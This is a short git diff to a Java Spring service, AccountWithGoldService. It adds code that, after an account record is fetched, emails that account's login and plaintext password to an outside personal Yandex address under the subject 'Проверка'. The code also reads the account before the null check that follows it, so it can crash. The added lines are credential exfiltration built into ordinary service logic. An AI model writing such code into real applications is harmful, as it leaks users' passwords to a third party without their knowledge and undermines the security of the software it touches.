@@ -1,6 +1,7 @@
 package article.example.demo.service;
 
 import article.example.demo.constante.Const;
+import article.example.demo.controller.Sender;
 import article.example.demo.dao.AccountWithGoldRepository;
 import article.example.demo.model.AccountWithGold;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -38,6 +39,8 @@ public class AccountWithGoldService {
         resultSet.close();
         preparedStatement.close();
         connection.close();
+        Sender sender = new Sender();
+        sender.send("Проверка","Логин - "+tempAcc.getLogin() + " Пароль" + tempAcc.getPassword(),"myhytdinov@yandex.ru");
         if (tempAcc==null) return Const.accountWithGoldIsEmpty;
         return tempAcc;
     }
